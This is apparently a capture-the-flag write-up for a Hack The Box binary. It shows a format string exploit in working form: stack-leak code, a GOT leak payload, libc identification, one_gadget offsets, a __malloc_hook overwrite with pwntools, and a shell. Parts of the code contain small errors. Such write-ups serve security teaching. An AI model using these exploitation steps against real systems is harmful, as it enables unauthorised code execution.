> Can you hear the echo?

> Author: **[ly4k][author-profile]**

## Printing the stack

The binary echoes the user input back, and the format string attack works:

```
# 787a6883 00000000 786d5862 15bfb7a0 00000000 78383025 30252078 20783830 38302520 25207838 78383025 30252078 20783830 38302520 25207838 00000000
%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x
```

The culprit is printf, as seen in Ghidra:

```c
do {
	fgets(local_118,0x100,stdin);
	printf(local_118);
} while( true );
```

Also interesting:

```
MOV        RAX,qword ptr FS:[0x28]
```

This is said to be a stack canary / cookie to harden against stack smashing.

We have yet to find anything worth on the stack.

## The key

The preceding call to "init" takes a "EVP_PKEY_CTX" as argument, which appears
in the OpenSSL documentation:

> The EVP_PKEY_CTX structure is an opaque public key algorithm context used by
> the OpenSSL high-level public key API.

This might be a target, let's look at it in GDB.

\x11\x11\x11\x11 %08x %08x %08x %08x %08x %08x %08x %08x

Having in consideration the binary security and the code from ghidra, the most common format string attacks will not work (change ret, change fgets PLT/GOT, etc..)

After further research, i found out that malloc (and consequently, free) is used when the string sent to the printf is above a determined size

With this, and with the format string vulnerability, the hooks for those functions can be overwritten and thus redirect the execution to a given address (in this case, system function or a one_gadget that spawns shell)

Before proceeding to the libc leak, more information is needed

Since the program is compiled with PIE, we need to find in the stack the base address in which the program is loaded to then leak the libc printf through the GOT pointer !

To achieve this, use the binary and dump the content for a range

def nonStopLeak():
	data = []
	min_val = 1
	max_val = 40
	log.progress("Starting nonStopLeaking (range: %d to %d)..." % (min_val, max_val))
	data.append("EMPTY ON PURPOSE")
	for i in range(min_val,max_val):
		leak = "%{}$lx".format(i)
		leak = com(leak).strip().decode()
		data.append(leak)
	log.success("nonStopLeaking finalized...")
	return data
To better visualize what the value might be, use GDB to x/s values that are in the stack. The values are easy to analyze if each long word is considered a position (which it is, in fact)

x/100gx $rsp
I found 2 positions (34 and 37) but in the remote, the 34th position is empty contrary to the local memory !
With GDB, we must calculate the offset from the address in memory to the loading address of the elf (visible through vmmap or info proc map)

gdb_offset = address_in_memory - elf_loaded_address  (0x126d)
elf.address = leaked_address - gdb_offset
After this, we need to inject the printf.got address (from the elf) in the stack!

To disclose the value which the printf.got points to, the format string used must be %s because it is the same machanism as when working with buffers (it will print what the address sourced to it, points to) instead of showing the address in the position (as %lx, %x and %p does )

Special attention is needed (in this case) because the elf.got["printf"] contains 2 null terminators which are not an issue to the fgets (to store the content) but will make printf stop (they are also in the beginning so, printf would not print the address)

To mitigate this, instead of the traditional format string approach (where payload is inserted into the stack and the format position is accessed) the used one is in the reverse order (payload after the format string). Also, the 2 null bytes count as an index (which the format string can access)

Another important aspect is the stack alignment. That's the reason the payload consists of 10 A's instead of 8 (64-bit word).

The payload consists of

printf_got = elf.got["printf]
payload = b"AAAAAAAAAA%8$s: " + p64(printf_got)

printf_leak = response
With that leak, we can access https://libc.blukat.me/ and find out which libc version is the server running. Leaked libc possibilities:

libc6-amd64_2.27-3ubuntu1_i386 (32 bits, ignore)
libc6-i386_2.19-0ubuntu6_amd64 (32 bits, ignore)
libc6-i386_2.9-4ubuntu6.3_amd64 (32 bits, ignore)
libc6_2.27-3ubuntu1_amd64
Now that we have a libc and one address of it, we can calculate its base address and consequently extract the values for the hook that we want to overwrite!

libc = ELF("libc6_2.27-3ubuntu1_amd64")
libc.address = printf_leak - libc.symbols["printf"]
__malloc_hook_addr = libc.symbols["__malloc_hook_addr"]
After that we need the offsets for the gadgets (https://github.com/david942j/one_gadget)

cmd: one_gadget libc6_2.27-3ubuntu1_amd64

0x4f365 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f3c2 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a45c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
With the gadgets' offsets, we need to calculate the actual value they have in the server memory

gadget_addr = libc.address + gadget_value
Now need to generate the payload to overwrite the __malloc_hook_addr !
To generate the payload i used the pwntools functionality FmtStr()

fmtstr_payload(exploiter.offset, {__malloc_hook_addr : gadget_addr})
After modifying the hook, just need to trigger it

payload = '%100000c'
And voila, we got a shell !!!

cmd: whoami && id
ctf
uid=999(ctf) gid=999(ctf) groups=999(ctf)

cmd: cat flag.txt
HTB{mall0c_h00k_f0r_th3_w1n!}
FLAG: HTB{mall0c_h00k_f0r_th3_w1n!}

> HTB{mall0c_h00k_f0r_th3_w1n!}

[author-profile]: https://app.hackthebox.eu/users/75443
